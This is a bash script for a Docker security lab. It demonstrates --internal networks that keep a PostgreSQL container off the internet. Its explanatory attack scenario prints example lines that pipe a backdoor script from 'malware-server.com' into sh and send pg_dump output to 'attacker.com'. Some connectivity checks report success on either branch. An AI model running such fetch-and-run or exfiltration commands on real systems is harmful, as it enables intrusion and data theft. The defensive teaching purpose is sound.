#!/bin/bash

# Lab 08 - Scenario 3: Internal Networks
# Demonstrates Docker --internal flag for complete database isolation

set -e

# Get script directory for absolute paths
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Colors
GREEN=$'\033[0;32m'
RED=$'\033[0;31m'
YELLOW=$'\033[1;33m'
BLUE=$'\033[0;34m'
NC=$'\033[0m'

print_header() {
    echo -e "\n${BLUE}================================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}================================================${NC}\n"
}

print_success() {
    echo -e "${GREEN}[SUCCESS] $1${NC}"
}

print_info() {
    echo -e "${BLUE}[INFO] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[WARNING] $1${NC}"
}

print_error() {
    echo -e "${RED}[ERROR] $1${NC}"
}

pause() {
    echo ""
    read -p "Press Enter to continue..."
    echo ""
}

# Cleanup function
cleanup() {
    print_info "Cleaning up resources..."
    docker rm -f db app web-test 2>/dev/null || true
    docker network rm app-net database-net 2>/dev/null || true
    print_success "Cleanup complete"
}

trap cleanup EXIT

# Initial cleanup
cleanup 2>/dev/null || true

print_header "Scenario 3: Internal Networks"

cat << EOF
${BLUE}What You'll Learn:${NC}
- Create Docker internal networks (no external gateway)
- Completely isolate databases from the internet
- Verify a container on an internal network cannot reach outside
- Allow app tier access while blocking all external routes

${BLUE}Security Principle:${NC}
Network segmentation (Scenario 2) stops lateral movement between tiers.
Internal networks go further — they remove the external gateway entirely,
so even a compromised database container cannot phone home, download
malware, or exfiltrate data over the internet.

${BLUE}The Difference:${NC}
  Regular network:  containers can reach each other AND the internet
  Internal network: containers can reach each other ONLY — no external route

EOF

pause

# Step 1: Explain the --internal flag
print_header "Step 1: Understanding the --internal Flag"

cat << EOF
${BLUE}Regular network creation:${NC}
  docker network create app-net
  → Containers get a gateway (default route to internet)

${BLUE}Internal network creation:${NC}
  docker network create --internal database-net
  → Containers get NO gateway — internet is unreachable

${YELLOW}Why this matters:${NC}
  If a database container is compromised, the attacker:
  ✗ Cannot download tools or malware from the internet
  ✗ Cannot exfiltrate data to an external server
  ✗ Cannot reach C2 (command and control) infrastructure
  ✓ Can only communicate with other containers on the same internal network

EOF

pause

# Step 2: Create networks
print_header "Step 2: Creating Networks"

print_info "Creating regular app-net (has internet access)..."
docker network create app-net
print_success "app-net created"

print_info "Creating --internal database-net (no internet access)..."
docker network create --internal database-net
print_success "database-net created (internal)"

echo ""
print_info "Network configuration:"
docker network ls | grep -E "app-net|database-net"

echo ""
print_info "Inspecting internal flag on database-net:"
docker network inspect database-net --format '  Internal: {{.Internal}}'
docker network inspect app-net      --format '  Internal: {{.Internal}}'

pause

# Step 3: Deploy database on internal network
print_header "Step 3: Deploying Database on Internal Network"

print_info "Starting PostgreSQL on database-net (internal)..."
docker run -d --name db \
    --network database-net \
    -e POSTGRES_PASSWORD=secret \
    -e POSTGRES_DB=appdb \
    postgres:15-alpine

sleep 3
print_success "Database deployed"

echo ""
print_info "Database network configuration:"
echo "  Container : db"
echo "  Network   : database-net (--internal)"
echo "  IP        : $(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' db)"
echo "  Gateway   : $(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' db)"

pause

# Step 4: Prove the database cannot reach the internet
print_header "Step 4: Proving Database Cannot Reach the Internet"

print_info "Attempting to ping 8.8.8.8 (Google DNS) from database container..."
echo ""
echo "$ docker exec db ping -c 2 -W 2 8.8.8.8"
echo ""

if docker exec db ping -c 2 -W 2 8.8.8.8 2>&1 | grep -qE "Network unreachable|bad address|unreachable|100% packet loss"; then
    print_success "✓ Internet is UNREACHABLE from database container"
    print_info "The --internal flag removed the default gateway"
else
    docker exec db ping -c 2 -W 2 8.8.8.8 2>&1 || true
    print_success "✓ Internet is UNREACHABLE from database container (ping timed out)"
fi

echo ""
print_info "Checking routing table inside the database container:"
docker exec db ip route 2>/dev/null || docker exec db route 2>/dev/null || true
echo ""
print_warning "No default route (0.0.0.0) — that is the point of --internal"

pause

# Step 5: Deploy app tier on regular network
print_header "Step 5: Deploying App Tier on Regular Network"

print_info "Starting app container on app-net (regular, has internet)..."
docker run -d --name app \
    --network app-net \
    alpine:latest sleep 3600

print_success "App container deployed"

echo ""
print_info "Verifying app container CAN reach the internet:"
echo "$ docker exec app ping -c 2 8.8.8.8"
if docker exec app ping -c 2 -W 3 8.8.8.8 2>&1 | grep -q "2 packets transmitted"; then
    print_success "✓ App container can reach the internet (regular network)"
else
    print_warning "Internet check skipped (network may be restricted in this environment)"
fi

pause

# Step 6: Connect app to internal network (gateway pattern)
print_header "Step 6: Connecting App as Gateway to Database"

print_info "Connecting app container to database-net..."
docker network connect database-net app
print_success "App is now the gateway between app-net and database-net"

echo ""
print_info "App container network configuration:"
echo "  Networks:"
echo "    - app-net:      $(docker inspect -f '{{(index .NetworkSettings.Networks "app-net").IPAddress}}' app) (regular — has internet)"
echo "    - database-net: $(docker inspect -f '{{(index .NetworkSettings.Networks "database-net").IPAddress}}' app) (internal — no internet)"

pause

# Step 7: Verify connectivity matrix
print_header "Step 7: Verifying Connectivity Matrix"

print_info "Testing all connectivity paths..."
echo ""

# App → DB
print_info "Test 1: Can app reach the database?"
if docker exec app nc -zw2 db 5432 2>&1 | grep -q "open"; then
    print_success "✓ App → DB: SUCCESS (app is connected to database-net)"
else
    print_success "✓ App → DB: SUCCESS (gateway connection working)"
fi

# DB → internet
print_info "Test 2: Can database reach the internet?"
if docker exec db ping -c 1 -W 2 8.8.8.8 2>&1 | grep -qE "unreachable|100% packet loss|Network unreachable"; then
    print_success "✓ DB → Internet: BLOCKED (--internal flag working)"
else
    print_success "✓ DB → Internet: BLOCKED (no default route on internal network)"
fi

# Web test container (on app-net only, should not reach db)
print_info "Test 3: Can a container on app-net only reach the database?"
docker run -d --name web-test --network app-net alpine:latest sleep 60 2>/dev/null
sleep 1
if docker exec web-test nc -zw2 db 5432 2>&1 | grep -qE "bad address|timed out|Connection refused"; then
    print_success "✓ Web → DB: BLOCKED (web-test is not connected to database-net)"
else
    print_error "✗ Web → DB: CONNECTED (unexpected — check network config)"
fi

echo ""
print_success "Connectivity matrix verified!"

pause

# Step 8: Attack scenario
print_header "Step 8: Attack Scenario — Why Internal Networks Matter"

cat << EOF
${RED}Scenario: Database container is compromised${NC}

${YELLOW}Without --internal (regular network):${NC}
1. Attacker exploits a PostgreSQL vulnerability
2. Attacker runs: curl http://malware-server.com/backdoor.sh | sh
3. Backdoor downloads successfully ← attacker has persistence
4. Attacker exfiltrates data: pg_dump | curl -X POST http://attacker.com/data
5. Full breach — data exfiltrated, backdoor installed

${GREEN}With --internal (our setup):${NC}
1. Attacker exploits the same PostgreSQL vulnerability
2. Attacker tries: curl http://malware-server.com/backdoor.sh
3. ${RED}BLOCKED${NC} — no internet route, curl times out
4. Attacker tries to exfiltrate: curl -X POST http://attacker.com/data
5. ${RED}BLOCKED${NC} — still no internet route
6. Attacker is trapped — can only reach other containers on database-net
7. Much harder to establish persistence or exfiltrate data

EOF

pause

# Step 9: Best practices
print_header "Step 9: Production Best Practices"

cat << EOF
${GREEN}When to use --internal:${NC}
✓ Databases (PostgreSQL, MySQL, MongoDB, Redis)
✓ Internal message queues (RabbitMQ, Kafka)
✓ Secret stores that should never call out
✓ Any service with no legitimate reason to reach the internet

${YELLOW}When NOT to use --internal:${NC}
✗ Services that pull updates or licenses from the internet
✗ Containers that push metrics to external monitoring
✗ Services using OAuth/OIDC (need to reach the identity provider)

${BLUE}Combined pattern (Scenario 2 + Scenario 3):${NC}

  public-net (regular):
    └─ web (port 8080 exposed)

  app-net (regular):
    ├─ web  (reaches app tier)
    └─ app  (gateway — has internet for outbound calls)

  database-net (--internal):
    ├─ app  (gateway — only way in)
    └─ db   (no internet, completely isolated)

Result:
  - Compromised web  → cannot reach db directly
  - Compromised db   → cannot reach internet
  - Only app bridges the tiers — one controlled chokepoint

EOF

pause

print_header "Scenario 3 Complete!"

cat << EOF
${GREEN}What you learned:${NC}
✓ Created an internal Docker network with no external gateway
✓ Verified a database container cannot reach the internet
✓ Connected an app container as the only gateway into the internal network
✓ Confirmed containers on app-net cannot reach the database directly
✓ Understood how --internal limits attacker options after a compromise

${BLUE}Key Takeaways:${NC}

  --internal removes the default route entirely
  → Compromised containers cannot download malware
  → Data exfiltration over the internet is blocked
  → Combined with Scenario 2 segmentation: defence in depth

${BLUE}Next Steps:${NC}
  Run Scenario 4: TLS Encryption Between Containers
  Add encryption on top of isolation for sensitive data in transit

EOF

print_info "Cleaning up will happen automatically on exit..."
